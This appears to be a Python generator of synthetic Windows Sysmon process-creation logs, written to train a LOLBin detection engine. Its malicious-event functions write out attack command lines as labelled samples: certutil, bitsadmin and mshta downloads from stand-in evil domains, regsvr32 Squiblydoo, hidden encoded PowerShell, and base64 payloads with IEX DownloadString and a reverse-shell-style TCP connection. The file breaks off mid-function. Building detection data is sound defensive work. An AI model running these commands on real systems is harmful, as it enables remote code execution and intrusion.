#!/usr/bin/env python3
"""
Synthetic Sysmon Event ID 1 Process Creation Log Generator
===========================================================
Generates realistic synthetic Windows process creation events for training
and evaluating the LOLBins Hybrid Detection Engine.

Produces three categories:
- 800 BENIGN events: normal workday Windows activity
- 100 MALICIOUS events: 10 distinct LOLBin attack techniques
- 100 GRAY-AREA events: legitimate admin actions that resemble attacks

Author: Eswar Achari
"""

import os
import sys
import json
import csv
import uuid
import random
import string
import base64
from datetime import datetime, timedelta
from typing import List, Dict

import numpy as np
import pandas as pd


# ─────────────────────── Reproducibility ───────────────────────
random.seed(42)
np.random.seed(42)


# ─────────────────────── Constants ─────────────────────────────

USERS_NORMAL = [
    "CORP\\jsmith", "CORP\\agarwal", "CORP\\mjones", "CORP\\klee",
    "CORP\\pchen", "CORP\\analyst01", "CORP\\analyst02", "CORP\\helpdesk",
    "CORP\\dbadmin", "CORP\\netadmin",
]

USERS_ADMIN = ["CORP\\admin", "CORP\\sysadmin", "CORP\\itops"]

USERS_SYSTEM = [
    "NT AUTHORITY\\SYSTEM",
    "NT AUTHORITY\\LOCAL SERVICE",
    "NT AUTHORITY\\NETWORK SERVICE",
]

EVIL_DOMAINS = [
    "evil-payload", "malware-cdn", "c2-server", "darkops", "shadow-net",
    "exploit-kit", "rat-delivery", "stager", "beacon-drop", "cobaltstrike",
    "apt-infra", "phish-host", "loader-cdn", "dropper-srv", "exfil-gate",
]

EVIL_TLDS = [".com", ".net", ".org", ".xyz", ".top", ".cc", ".io", ".ru"]

INTERNAL_SERVERS = [
    "internal-wsus.corp.local", "sccm01.corp.local", "fileserver.corp.local",
    "deploy.corp.local", "repo.corp.local",
]

# Base date for event generation (simulating a work week)
BASE_DATE = datetime(2024, 7, 1, 0, 0, 0)  # Monday


# ─────────────────────── Helper Functions ──────────────────────

def random_guid() -> str:
    """Generate a Sysmon-style process GUID."""
    return "{" + str(uuid.uuid4()).upper() + "}"


def random_pid() -> int:
    """Generate a realistic Windows PID."""
    return random.randint(1000, 65535)


def random_evil_domain() -> str:
    """Generate a randomized evil-looking domain."""
    base = random.choice(EVIL_DOMAINS)
    suffix = random.randint(10, 9999)
    tld = random.choice(EVIL_TLDS)
    return f"{base}{suffix}{tld}"


def random_filename(ext: str = ".exe") -> str:
    """Generate a random-looking filename."""
    words = ["update", "svc", "helper", "agent", "runtime", "patch",
             "installer", "loader", "module", "driver", "core", "sys"]
    name = random.choice(words) + str(random.randint(1, 999))
    return name + ext


def random_base64_payload(length: int = None) -> str:
    """Generate realistic-looking base64-encoded PowerShell payload."""
    if length is None:
        length = random.randint(50, 200)
    # Create something that looks like encoded PS commands
    ps_commands = [
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p')",
        "$s=New-Object IO.MemoryStream;IEX([Text.Encoding]::UTF8.GetString($s))",
        "Invoke-Expression (Get-Content C:\\Users\\Public\\payload.ps1)",
        "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream()",
        "Add-Type -AssemblyName System.Drawing;$g=[Drawing.Bitmap]::new($u)",
    ]
    payload = random.choice(ps_commands)
    encoded = base64.b64encode(payload.encode('utf-16-le')).decode('ascii')
    return encoded


def workday_timestamp(bias: str = "business") -> str:
    """
    Generate a realistic timestamp.
    
    Args:
        bias: 'business' (8am-6pm), 'evening' (6pm-10pm), 
              'off_hours' (1am-5am), 'any'
    """
    day_offset = random.randint(0, 4)  # Mon-Fri
    base = BASE_DATE + timedelta(days=day_offset)

    if bias == "business":
        hour = random.randint(8, 17)
    elif bias == "evening":
        hour = random.randint(18, 22)
    elif bias == "off_hours":
        hour = random.randint(1, 4)
        # Occasionally on weekends too
        if random.random() < 0.3:
            day_offset = random.choice([5, 6])
            base = BASE_DATE + timedelta(days=day_offset)
    elif bias == "weekend":
        day_offset = random.choice([5, 6])
        base = BASE_DATE + timedelta(days=day_offset)
        hour = random.randint(8, 20)
    else:
        hour = random.randint(0, 23)

    minute = random.randint(0, 59)
    second = random.randint(0, 59)
    ms = random.randint(0, 999)

    ts = base.replace(hour=hour, minute=minute, second=second,
                      microsecond=ms * 1000)
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ms:03d}Z"


def make_event(image: str, cmdline: str, parent_image: str,
               parent_cmdline: str, user: str, integrity: str,
               is_malicious: int, technique_id: str, technique_name: str,
               label: str, timestamp: str = None) -> Dict:
    """Create a single Sysmon Event ID 1 record."""
    if timestamp is None:
        timestamp = workday_timestamp("business")

    return {
        "UtcTime": timestamp,
        "ProcessGuid": random_guid(),
        "ProcessId": random_pid(),
        "Image": image,
        "CommandLine": cmdline,
        "ParentImage": parent_image,
        "ParentCommandLine": parent_cmdline,
        "ParentProcessId": random_pid(),
        "User": user,
        "IntegrityLevel": integrity,
        "is_malicious": is_malicious,
        "mitre_technique_id": technique_id,
        "technique_name": technique_name,
        "label": label,
    }


# ─────────────────── BENIGN Event Generators ───────────────────

def gen_benign_events(count: int = 800) -> List[Dict]:
    """Generate realistic benign Windows workday events."""
    events = []

    # --- Category weights for benign event types ---
    generators = [
        (0.20, _gen_explorer_apps),       # Explorer launching apps
        (0.15, _gen_service_activity),     # Service host activity
        (0.12, _gen_cmd_usage),            # Normal cmd usage
        (0.10, _gen_legit_powershell),     # Legitimate PowerShell
        (0.08, _gen_windows_update),       # Windows Update
        (0.08, _gen_software_install),     # Software installs
        (0.07, _gen_admin_tools),          # Admin tools
        (0.05, _gen_office_activity),      # Office normal activity
        (0.05, _gen_browser_activity),     # Browser launches
        (0.05, _gen_scheduled_tasks),      # Scheduled tasks
        (0.03, _gen_system_processes),     # System processes
        (0.02, _gen_dev_tools),            # Developer tools
    ]

    for weight, generator in generators:
        n = max(1, int(count * weight))
        events.extend(generator(n))

    # Shuffle and trim to exact count
    random.shuffle(events)
    return events[:count]


def _gen_explorer_apps(n: int) -> List[Dict]:
    """Explorer.exe spawning user applications."""
    apps = [
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         "chrome.exe --no-first-run"),
        ("C:\\Program Files\\Mozilla Firefox\\firefox.exe",
         "firefox.exe"),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
         "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n"),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
         "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\""),
        ("C:\\Windows\\System32\\notepad.exe", "notepad.exe"),
        ("C:\\Windows\\System32\\calc.exe", "calc.exe"),
        ("C:\\Program Files\\Microsoft VS Code\\Code.exe", "Code.exe"),
        ("C:\\Program Files\\Slack\\Slack.exe", "Slack.exe"),
        ("C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe", "Teams.exe"),
        ("C:\\Program Files\\Zoom\\bin\\Zoom.exe", "Zoom.exe"),
        ("C:\\Windows\\explorer.exe", "explorer.exe C:\\Users\\{user}\\Documents"),
        ("C:\\Program Files\\7-Zip\\7zFM.exe", "7zFM.exe"),
        ("C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe", "Acrobat.exe"),
    ]
    events = []
    for _ in range(n):
        app_image, app_cmd = random.choice(apps)
        user = random.choice(USERS_NORMAL)
        app_cmd = app_cmd.replace("{user}", user.split("\\")[1])
        ts_bias = random.choices(
            ["business", "evening", "any"], weights=[0.75, 0.20, 0.05]
        )[0]
        events.append(make_event(
            image=app_image, cmdline=app_cmd,
            parent_image="C:\\Windows\\explorer.exe",
            parent_cmdline="C:\\Windows\\explorer.exe /factory,{GUID}",
            user=user, integrity="Medium",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp(ts_bias),
        ))
    return events


def _gen_service_activity(n: int) -> List[Dict]:
    """Service host and system service activity."""
    service_cmds = [
        ("C:\\Windows\\System32\\svchost.exe",
         "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"),
        ("C:\\Windows\\System32\\svchost.exe",
         "C:\\Windows\\System32\\svchost.exe -k LocalService -p"),
        ("C:\\Windows\\System32\\svchost.exe",
         "C:\\Windows\\System32\\svchost.exe -k NetworkService"),
        ("C:\\Windows\\System32\\svchost.exe",
         "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p"),
        ("C:\\Windows\\System32\\spoolsv.exe",
         "C:\\Windows\\System32\\spoolsv.exe"),
        ("C:\\Windows\\System32\\lsass.exe",
         "C:\\Windows\\System32\\lsass.exe"),
        ("C:\\Windows\\System32\\SearchIndexer.exe",
         "C:\\Windows\\System32\\SearchIndexer.exe /Embedding"),
        ("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
         "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"),
        ("C:\\Windows\\System32\\taskhostw.exe",
         "taskhostw.exe"),
        ("C:\\Program Files\\Windows Defender\\MsMpEng.exe",
         "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\""),
    ]
    events = []
    for _ in range(n):
        svc_image, svc_cmd = random.choice(service_cmds)
        events.append(make_event(
            image=svc_image, cmdline=svc_cmd,
            parent_image="C:\\Windows\\System32\\services.exe",
            parent_cmdline="C:\\Windows\\System32\\services.exe",
            user=random.choice(USERS_SYSTEM), integrity="System",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("any"),
        ))
    return events


def _gen_cmd_usage(n: int) -> List[Dict]:
    """Normal command prompt usage by users/admins."""
    commands = [
        "ipconfig /all", "ping 8.8.8.8", "ping google.com",
        "nslookup corp.local", "netstat -an", "systeminfo",
        "hostname", "whoami", "dir C:\\Users", "tasklist",
        "net user", "net localgroup administrators",
        "gpupdate /force", "arp -a", "tracert 8.8.8.8",
        "type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "net view \\\\fileserver", "net use Z: \\\\fileserver\\share",
        "xcopy C:\\Data D:\\Backup /s /e", "robocopy C:\\Data D:\\Backup /mir",
    ]
    events = []
    for _ in range(n):
        cmd = random.choice(commands)
        user = random.choice(USERS_NORMAL + USERS_ADMIN)
        integrity = "High" if user in USERS_ADMIN else "Medium"
        events.append(make_event(
            image="C:\\Windows\\System32\\cmd.exe",
            cmdline=f"cmd.exe /c {cmd}",
            parent_image="C:\\Windows\\explorer.exe",
            parent_cmdline="C:\\Windows\\explorer.exe",
            user=user, integrity=integrity,
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_legit_powershell(n: int) -> List[Dict]:
    """Legitimate PowerShell usage — unencoded, normal cmdlets."""
    ps_commands = [
        "Get-Process | Sort-Object CPU -Descending | Select -First 10",
        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "Get-EventLog -LogName System -Newest 50",
        "Get-WmiObject Win32_OperatingSystem | Select Caption, Version",
        "Test-Connection -ComputerName fileserver -Count 4",
        "Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate",
        "Import-Module ActiveDirectory; Get-ADComputer -Filter *",
        "Get-ChildItem -Path C:\\Logs -Recurse -Filter *.log",
        "Get-Content C:\\Scripts\\inventory.ps1 | Out-File C:\\Reports\\output.txt",
        "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
        "Install-Module -Name Az -AllowClobber -Force",
        "Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}",
        "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
        "Restart-Service -Name Spooler -Force",
        "Get-Disk | Get-Partition | Get-Volume",
    ]
    events = []
    for _ in range(n):
        cmd = random.choice(ps_commands)
        user = random.choice(USERS_ADMIN + USERS_NORMAL[:3])
        integrity = "High" if user in USERS_ADMIN else "Medium"
        parent = random.choice([
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\cmd.exe",
        ])
        events.append(make_event(
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cmdline=f"powershell.exe -NoProfile -Command \"{cmd}\"",
            parent_image=parent,
            parent_cmdline=f"{parent}",
            user=user, integrity=integrity,
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_windows_update(n: int) -> List[Dict]:
    """Windows Update and patching activity."""
    events = []
    update_procs = [
        ("C:\\Windows\\System32\\wuauclt.exe",
         "wuauclt.exe /detectnow /updatenow"),
        ("C:\\Windows\\servicing\\TrustedInstaller.exe",
         "C:\\Windows\\servicing\\TrustedInstaller.exe"),
        ("C:\\Windows\\System32\\svchost.exe",
         "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv"),
        ("C:\\Windows\\System32\\UsoClient.exe",
         "UsoClient.exe StartInteractiveScan"),
        ("C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
         "update.exe /quiet /norestart"),
    ]
    for _ in range(n):
        img, cmd = random.choice(update_procs)
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\System32\\svchost.exe",
            parent_cmdline="C:\\Windows\\System32\\svchost.exe -k netsvcs",
            user="NT AUTHORITY\\SYSTEM", integrity="System",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("any"),
        ))
    return events


def _gen_software_install(n: int) -> List[Dict]:
    """Legitimate software installation events."""
    events = []
    installs = [
        ("C:\\Windows\\System32\\msiexec.exe",
         "msiexec.exe /i C:\\Installers\\app_setup_{v}.msi /quiet"),
        ("C:\\Users\\{user}\\Downloads\\setup.exe",
         "setup.exe /S /v/qn"),
        ("C:\\Windows\\System32\\msiexec.exe",
         "msiexec.exe /i C:\\Temp\\update_{v}.msi /passive /norestart"),
        ("C:\\Users\\{user}\\Downloads\\installer.exe",
         "installer.exe --silent --accept-license"),
    ]
    for _ in range(n):
        img, cmd = random.choice(installs)
        user = random.choice(USERS_ADMIN)
        v = f"{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,99)}"
        cmd = cmd.replace("{v}", v).replace("{user}", user.split("\\")[1])
        img = img.replace("{user}", user.split("\\")[1])
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            parent_cmdline="C:\\Windows\\explorer.exe",
            user=user, integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_admin_tools(n: int) -> List[Dict]:
    """Administrative tool launches."""
    tools = [
        ("C:\\Windows\\System32\\taskmgr.exe", "taskmgr.exe"),
        ("C:\\Windows\\regedit.exe", "regedit.exe"),
        ("C:\\Windows\\System32\\mmc.exe", "mmc.exe devmgmt.msc"),
        ("C:\\Windows\\System32\\mmc.exe", "mmc.exe compmgmt.msc"),
        ("C:\\Windows\\System32\\mmc.exe", "mmc.exe diskmgmt.msc"),
        ("C:\\Windows\\System32\\perfmon.exe", "perfmon.exe"),
        ("C:\\Windows\\System32\\eventvwr.exe", "eventvwr.exe"),
        ("C:\\Windows\\System32\\resmon.exe", "resmon.exe"),
    ]
    events = []
    for _ in range(n):
        img, cmd = random.choice(tools)
        user = random.choice(USERS_ADMIN)
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            parent_cmdline="C:\\Windows\\explorer.exe",
            user=user, integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_office_activity(n: int) -> List[Dict]:
    """Normal Office application child processes (not malicious)."""
    events = []
    office_children = [
        # Word opening a PDF viewer
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
         "Acrobat.exe C:\\Users\\{user}\\Documents\\report.pdf"),
        # Excel calling ODBC
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
         "C:\\Windows\\System32\\odbcad32.exe", "odbcad32.exe"),
        # Outlook launching browser
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
         "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         "chrome.exe https://sharepoint.corp.local/sites/team"),
        # PowerPoint auto-save
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
         "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
         "OneDrive.exe /sync"),
    ]
    for _ in range(n):
        parent_img, child_img, child_cmd = random.choice(office_children)
        user = random.choice(USERS_NORMAL)
        child_cmd = child_cmd.replace("{user}", user.split("\\")[1])
        events.append(make_event(
            image=child_img, cmdline=child_cmd,
            parent_image=parent_img,
            parent_cmdline=f"\"{parent_img}\"",
            user=user, integrity="Medium",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_browser_activity(n: int) -> List[Dict]:
    """Browser spawning helper processes."""
    events = []
    for _ in range(n):
        browser = random.choice([
            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
             "chrome.exe --type=renderer --field-trial-handle=12345"),
            ("C:\\Program Files\\Mozilla Firefox\\firefox.exe",
             "firefox.exe -contentproc -childID 7"),
            ("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
             "msedge.exe --type=gpu-process"),
        ])
        events.append(make_event(
            image=browser[0], cmdline=browser[1],
            parent_image=browser[0],
            parent_cmdline=f"\"{browser[0]}\"",
            user=random.choice(USERS_NORMAL), integrity="Low",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_scheduled_tasks(n: int) -> List[Dict]:
    """Scheduled task execution."""
    events = []
    tasks = [
        ("C:\\Windows\\System32\\schtasks.exe",
         "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\""),
        ("C:\\Windows\\System32\\taskeng.exe",
         "taskeng.exe {GUID} S"),
        ("C:\\Windows\\System32\\conhost.exe",
         "conhost.exe 0xffffffff -ForceV1"),
    ]
    for _ in range(n):
        img, cmd = random.choice(tasks)
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\System32\\svchost.exe",
            parent_cmdline="C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
            user="NT AUTHORITY\\SYSTEM", integrity="System",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("any"),
        ))
    return events


def _gen_system_processes(n: int) -> List[Dict]:
    """Core Windows system processes."""
    events = []
    sysprocs = [
        ("C:\\Windows\\System32\\csrss.exe", "csrss.exe ObjectDirectory=\\Windows"),
        ("C:\\Windows\\System32\\smss.exe", "smss.exe"),
        ("C:\\Windows\\System32\\wininit.exe", "wininit.exe"),
        ("C:\\Windows\\System32\\winlogon.exe", "winlogon.exe"),
        ("C:\\Windows\\System32\\dwm.exe", "dwm.exe"),
        ("C:\\Windows\\System32\\fontdrvhost.exe", "fontdrvhost.exe"),
    ]
    for _ in range(n):
        img, cmd = random.choice(sysprocs)
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\System32\\smss.exe",
            parent_cmdline="smss.exe",
            user="NT AUTHORITY\\SYSTEM", integrity="System",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("any"),
        ))
    return events


def _gen_dev_tools(n: int) -> List[Dict]:
    """Developer tool usage."""
    events = []
    tools = [
        ("C:\\Program Files\\Git\\bin\\git.exe", "git.exe status"),
        ("C:\\Program Files\\Git\\bin\\git.exe", "git.exe pull origin main"),
        ("C:\\Program Files\\nodejs\\node.exe", "node.exe server.js"),
        ("C:\\Python311\\python.exe", "python.exe script.py"),
        ("C:\\Program Files\\Docker\\Docker\\resources\\bin\\docker.exe",
         "docker.exe ps -a"),
    ]
    for _ in range(n):
        img, cmd = random.choice(tools)
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_NORMAL[:4]), integrity="Medium",
            is_malicious=0, technique_id="", technique_name="",
            label="benign", timestamp=workday_timestamp("business"),
        ))
    return events


# ─────────────────── MALICIOUS Event Generators ────────────────

def gen_malicious_events(count: int = 100) -> List[Dict]:
    """
    Generate malicious LOLBin attack events covering 10 MITRE ATT&CK techniques.
    Each technique gets ~10 events with randomized parameters.
    """
    events = []
    per_technique = max(1, count // 10)

    technique_generators = [
        _gen_certutil_download,
        _gen_mshta_remote,
        _gen_regsvr32_squiblydoo,
        _gen_rundll32_javascript,
        _gen_powershell_encoded,
        _gen_office_macro_chain,
        _gen_bitsadmin_download,
        _gen_msbuild_execution,
        _gen_wscript_remote,
        _gen_certutil_encode_decode,
    ]

    for generator in technique_generators:
        events.extend(generator(per_technique))

    random.shuffle(events)
    return events[:count]


def _mal_timestamp() -> str:
    """Generate timestamp biased toward off-hours for malicious events."""
    bias = random.choices(
        ["off_hours", "business", "evening"],
        weights=[0.60, 0.20, 0.20]
    )[0]
    return workday_timestamp(bias)


def _gen_certutil_download(n: int) -> List[Dict]:
    """T1105 - Certutil URL cache download."""
    events = []
    for _ in range(n):
        domain = random_evil_domain()
        payload = random_filename(".exe")
        local_path = f"C:\\Users\\Public\\{random_filename('.exe')}"
        # Randomize the exact command format
        cmd_variants = [
            f"certutil.exe -urlcache -split -f http://{domain}/{payload} {local_path}",
            f"certutil.exe -urlcache -f http://{domain}/{payload} {local_path}",
            f"certutil  -urlcache -split -f http://{domain}/downloads/{payload} {local_path}",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\certutil.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ]),
            parent_cmdline="cmd.exe" if random.random() > 0.5 else "powershell.exe",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1105",
            technique_name="Certutil Download",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_mshta_remote(n: int) -> List[Dict]:
    """T1218.005 - Mshta remote HTA execution."""
    events = []
    for _ in range(n):
        domain = random_evil_domain()
        script = f"script{random.randint(1, 999)}.hta"
        cmd_variants = [
            f"mshta.exe http://{domain}/{script}",
            f"mshta.exe http://{domain}/payloads/{script}",
            f"mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"http://{domain}/{script}\"\"\")",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\mshta.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=random.choice([
                "C:\\Windows\\explorer.exe",
                "C:\\Windows\\System32\\cmd.exe",
            ]),
            parent_cmdline="explorer.exe" if random.random() > 0.5 else "cmd.exe",
            user=random.choice(USERS_NORMAL[:5]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1218.005",
            technique_name="Mshta Remote HTA",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_regsvr32_squiblydoo(n: int) -> List[Dict]:
    """T1218.010 - Regsvr32 Squiblydoo attack."""
    events = []
    for _ in range(n):
        domain = random_evil_domain()
        sct = f"file{random.randint(1, 999)}.sct"
        cmd_variants = [
            f"regsvr32.exe /s /n /u /i:http://{domain}/{sct} scrobj.dll",
            f"regsvr32 /s /n /u /i:http://{domain}/payloads/{sct} scrobj.dll",
            f"regsvr32.exe /s /n /u /i:http://{domain}/drop/{sct} scrobj.dll",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\regsvr32.exe",
            cmdline=random.choice(cmd_variants),
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe /c",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1218.010",
            technique_name="Regsvr32 Squiblydoo",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_rundll32_javascript(n: int) -> List[Dict]:
    """T1218.011 - Rundll32 JavaScript execution."""
    events = []
    for _ in range(n):
        b64 = random_base64_payload(random.randint(40, 80))
        cmd_variants = [
            f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -enc {b64}")',
            f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c {random_filename()}")',
            f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval("window.close")',
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\rundll32.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=random.choice([
                "C:\\Windows\\explorer.exe",
                "C:\\Windows\\System32\\cmd.exe",
            ]),
            parent_cmdline="cmd.exe" if random.random() > 0.5 else "explorer.exe",
            user=random.choice(USERS_NORMAL[:5]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1218.011",
            technique_name="Rundll32 JavaScript",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_powershell_encoded(n: int) -> List[Dict]:
    """T1059.001 - PowerShell with encoded command."""
    events = []
    for _ in range(n):
        b64 = random_base64_payload()
        cmd_variants = [
            f"powershell.exe -nop -w hidden -enc {b64}",
            f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {b64}",
            f"powershell.exe -ep bypass -nop -w hidden -enc {b64}",
            f"powershell.exe -exec bypass -noni -nop -w hidden -enc {b64}",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            ]),
            parent_cmdline="cmd.exe" if random.random() > 0.5 else "WINWORD.EXE /n",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1059.001",
            technique_name="PowerShell Encoded Command",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_office_macro_chain(n: int) -> List[Dict]:
    """T1204.002 - Office macro spawning shell processes."""
    events = []
    office_apps = [
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    ]
    for _ in range(n):
        b64 = random_base64_payload(random.randint(60, 150))
        parent_office = random.choice(office_apps)
        # Office -> cmd -> powershell chain
        cmd_variants = [
            f"cmd.exe /c powershell.exe -nop -w hidden -enc {b64}",
            f"cmd.exe /c powershell.exe -ep bypass -enc {b64}",
            f"cmd.exe /c powershell -noni -nop -w hidden -enc {b64}",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\cmd.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=parent_office,
            parent_cmdline=f"\"{parent_office}\" /n document{random.randint(1,99)}.docm",
            user=random.choice(USERS_NORMAL[:5]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1204.002",
            technique_name="Office Macro Execution",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_bitsadmin_download(n: int) -> List[Dict]:
    """T1197 - BITSAdmin file download."""
    events = []
    for _ in range(n):
        domain = random_evil_domain()
        payload = random_filename(".exe")
        job = f"job{random.randint(100, 9999)}"
        local = f"C:\\Users\\Public\\{random_filename('.exe')}"
        cmd_variants = [
            f"bitsadmin.exe /transfer {job} /download /priority high http://{domain}/{payload} {local}",
            f"bitsadmin.exe /transfer {job} /download http://{domain}/files/{payload} {local}",
            f"bitsadmin /transfer {job} http://{domain}/{payload} {local}",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\bitsadmin.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ]),
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1197",
            technique_name="BITSAdmin Download",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_msbuild_execution(n: int) -> List[Dict]:
    """T1127.001 - MSBuild inline task execution."""
    events = []
    fw_versions = ["v4.0.30319", "v3.5"]
    for _ in range(n):
        ver = random.choice(fw_versions)
        proj = f"C:\\Users\\Public\\{random_filename('.csproj')}"
        events.append(make_event(
            image=f"C:\\Windows\\Microsoft.NET\\Framework\\{ver}\\MSBuild.exe",
            cmdline=f"C:\\Windows\\Microsoft.NET\\Framework\\{ver}\\MSBuild.exe {proj}",
            parent_image=random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ]),
            parent_cmdline="cmd.exe" if random.random() > 0.5 else "powershell.exe",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1127.001",
            technique_name="MSBuild Inline Task",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_wscript_remote(n: int) -> List[Dict]:
    """T1059.005 - WScript/CScript remote script execution."""
    events = []
    for _ in range(n):
        domain = random_evil_domain()
        # Alternate between wscript and cscript
        if random.random() > 0.5:
            img = "C:\\Windows\\System32\\wscript.exe"
            script = f"script{random.randint(1, 999)}.js"
            cmd = f"wscript.exe //e:jscript http://{domain}/{script}"
        else:
